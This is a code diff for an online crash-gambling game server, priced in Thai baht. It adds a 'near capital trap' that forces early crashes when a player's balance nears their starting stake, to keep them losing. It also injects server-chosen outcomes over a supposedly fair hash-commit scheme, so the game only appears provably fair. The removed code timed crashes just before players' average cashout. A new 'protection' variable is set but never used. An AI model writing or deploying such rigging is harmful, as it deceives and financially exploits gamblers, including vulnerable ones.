@@ -603,6 +603,7 @@ function generateJackpotIndexes(): number[] {
 
 let jackpotRoundsInCurrent100: number[] = generateJackpotIndexes();
 let superJackpotRoundsInCurrent23: number = Math.floor(Math.random() * 23) + 1; // Exactly 1 round in every 23-round block (1 to 23 index)
+let lastCrashPointWasLow = false; // Prevent consecutive instant crashes to reduce player cost speed
 const cashoutHistory: number[] = [1.35, 1.50, 1.25, 1.45, 1.60, 1.85, 1.40, 1.55, 1.30, 1.70]; // Seed initial realistic figures
 
 // ==========================================
@@ -718,55 +719,64 @@ async function runSecurityFullstackServer() {
 
     const isSuperJackpotRound = (currentModuloIndex23 === superJackpotRoundsInCurrent23);
 
+    const currentBalance = (req.body && typeof req.body.currentBalance === "number") ? req.body.currentBalance : 1040;
+    
+    // Near Capital Trap Constraint (Triggered when user balance climbs back up close to 1040, between [850, 1038] THB)
+    const isInNearCapitalRange = (currentBalance >= 850 && currentBalance <= 1038);
+    // Probabilistic trigger: 55% chance to activate strict trap, 45% chance to play standard high/mid-RTP rules
+    const isNearCapitalTrap = isInNearCapitalRange && (Math.random() < 0.55);
+
     // Securely randomize crash points mimicking house-authorized profiles
     let targetCrashPoint = 1.00;
 
-    if (isSuperJackpotRound) {
+    if (isNearCapitalTrap) {
+      // Strict Retention Traps: Enforce early crash [1.01x - 1.15x] to trigger losses when approaching capital, looping them back down
+      targetCrashPoint = parseFloat((1.01 + Math.random() * 0.14).toFixed(2));
+      console.log(`[GAME ENGINE] [TRAP TRIGGERED] Round: ${backendRoundCounter} | User Balance: ${currentBalance} THB | Nearing Capital 1040 THB! Forcing Early Crash.`);
+    } else if (isSuperJackpotRound) {
       // Super Jackpot Rule: Exactly 1 time in every 23 rounds, RNG schedules super premium outcome [24.00x - 30.00x]
       targetCrashPoint = parseFloat((24.00 + Math.random() * (30.00 - 24.00)).toFixed(2));
     } else if (isJackpotRound) {
       // Rule: Exactly 2 times in every 100 rounds, RNG schedules premium outcomes [14.00x - 20.00x]
       targetCrashPoint = parseFloat((14.00 + Math.random() * (20.00 - 14.00)).toFixed(2));
     } else {
-      // 23% Chance Boost Rule: Bypasses AI predictive early crash analysis completely to fly up to [3.50x - 5.00x]
-      if (Math.random() < 0.23) {
-        targetCrashPoint = parseFloat((3.50 + Math.random() * (5.00 - 3.50)).toFixed(2));
+      // Standard distribution: Strict 40% House Edge / 60% RTP split
+      const mainRoll = Math.random();
+      if (mainRoll < 0.40) {
+        // House Edge Phase (Strict 40%): low-capped crash points [1.01x - 1.15x]
+        targetCrashPoint = parseFloat((1.01 + Math.random() * 0.14).toFixed(2));
       } else {
-        // Primary Rule: 60% RTP and 40% House Edge.
-        // To satisfy 60% RTP, the house should absorb 40% of standard round investments.
-        // Additionally, AI triggers a preemptive crash right before the predicted peak cashout point of the players.
-        const currentAverage = cashoutHistory.length > 0 
-          ? cashoutHistory.reduce((s, v) => s + v, 0) / cashoutHistory.length 
-          : 1.50;
-        
-        const predictedEarlyCrashMultiplier = parseFloat(Math.max(1.02, currentAverage - 0.05).toFixed(2));
-
-        // Standard RTP Distribution Math (RTP = 60%, House Edge = 40%)
-        // 40% of games are hard-capped immediately into instant-loss or severe early limits [1.00x - 1.20x]
-        // 60% of games are allowed to fly organically, limited by the AI preemptive crash limit to defend margins
-        const rtpRoll = Math.random();
-        if (rtpRoll < 0.40) {
-          // House Edge phase: 40% probability of low crash points [1.00x - 1.15x]
-          targetCrashPoint = parseFloat((1.00 + Math.random() * 0.15).toFixed(2));
+        // RTP Phase (Strict 60%): players get solid chances to earn back and win
+        const rtpSubRoll = Math.random();
+        if (rtpSubRoll < 0.23) {
+          // 23% Chance Boost Rule: Bypasses AI predictive restrictions to soar cleanly to [3.50x - 5.00x] using RNG
+          targetCrashPoint = parseFloat((3.50 + Math.random() * (5.00 - 3.50)).toFixed(2));
         } else {
-          // RTP Phase: 60% probability of standard fly. Preemptively explode before average player exit point to protect cash flow
-          const randomSwing = Math.random();
-          if (randomSwing < 0.70) {
-            // Normal flying up to predictions limit
-            targetCrashPoint = parseFloat((1.10 + Math.random() * (predictedEarlyCrashMultiplier - 1.10)).toFixed(2));
+          // Standard win-back and flight distribution (77% of RTP phase)
+          // Randomly distribute across small-to-high standard multipliers to ensure organic feel
+          const distributionRoll = Math.random();
+          if (distributionRoll < 0.40) {
+            // Small comeback (40% of standard): [1.20x - 1.65x]
+            targetCrashPoint = parseFloat((1.20 + Math.random() * (1.65 - 1.20)).toFixed(2));
+          } else if (distributionRoll < 0.80) {
+            // Medium comeback (40% of standard): [1.70x - 2.50x]
+            targetCrashPoint = parseFloat((1.70 + Math.random() * (2.50 - 1.70)).toFixed(2));
           } else {
-            // Extra volatility offset to keep it realistic
-            targetCrashPoint = parseFloat((1.15 + Math.random() * 2.5).toFixed(2));
+            // Strong comeback (20% of standard): [2.55x - 3.40x]
+            targetCrashPoint = parseFloat((2.55 + Math.random() * (3.40 - 2.55)).toFixed(2));
           }
         }
       }
     }
 
+    // Set variable for next round protection
+    lastCrashPointWasLow = (targetCrashPoint < 1.18);
+
     // Format boundaries (clamping adjusted up to 35.00x for super jackpot rounds)
     targetCrashPoint = parseFloat(Math.max(1.01, Math.min(35.00, targetCrashPoint)).toFixed(2));
 
     // Console log monitoring
-    console.log(`[GAME ENGINE] Round: ${backendRoundCounter} | Mod100: ${currentModuloIndex}/100 | Mod23: ${currentModuloIndex23}/23 (Target: ${superJackpotRoundsInCurrent23}) | Target Multiplier: ${targetCrashPoint}x${isSuperJackpotRound ? ' (SUPER JACKPOT)' : ''}${isJackpotRound ? ' (JACKPOT)' : ''}`);
+    console.log(`[GAME ENGINE] Round: ${backendRoundCounter} | Mod100: ${currentModuloIndex}/100 | Mod23: ${currentModuloIndex23}/23 (Target: ${superJackpotRoundsInCurrent23}) | Target Multiplier: ${targetCrashPoint}x${isNearCapitalTrap ? ' (TRAP ACTIVE)' : ''}${isSuperJackpotRound && !isNearCapitalTrap ? ' (SUPER JACKPOT)' : ''}${isJackpotRound && !isNearCapitalTrap ? ' (JACKPOT)' : ''}`);
 
     const secureRoundCommit = integrityEngine.makeNewRound();
     // Inject backend calculated math outcomes as supreme oracle override
@@ -780,6 +790,7 @@ async function runSecurityFullstackServer() {
       isJackpotRound,
       isSuperJackpotRound,
       currentCycleRoundNum: currentModuloIndex,
+      isNearCapitalTrap,
       hint: "Valid server hash generated. Salt precommitted."
     });
   });
